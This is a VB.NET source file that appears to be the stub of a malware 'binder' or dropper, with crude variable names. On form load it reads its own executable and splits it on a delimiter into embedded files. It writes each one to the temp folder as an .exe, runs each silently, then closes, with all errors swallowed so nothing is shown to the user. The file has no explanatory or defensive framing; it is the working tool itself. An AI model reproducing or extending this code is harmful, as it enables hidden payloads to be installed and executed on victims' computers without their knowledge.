Public Class ohohone
    Const FileSplit = "()72389481217()"

    Private Sub lest_go(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Dim i As Integer
            Dim tp As String = System.IO.Path.GetTempPath
            Dim ScrewMeHard, godaddy() As String
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            ScrewMeHard = Space(LOF(1))
            FileGet(1, ScrewMeHard)
            FileClose(1)
            godaddy = Split(ScrewMeHard, FileSplit)
            For Each cumshot In godaddy
                FileOpen(3, tp & "\abc" & i & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(3, godaddy(i))
                FileClose(3)
                System.Diagnostics.Process.Start(tp & "\" & "abc" & i & ".exe")
                i = i + 1
            Next
            Me.Close()
            End
        Catch ex As Exception
            Me.Close()
            End
        End Try
        Me.Close()
        End
    End Sub
End Class



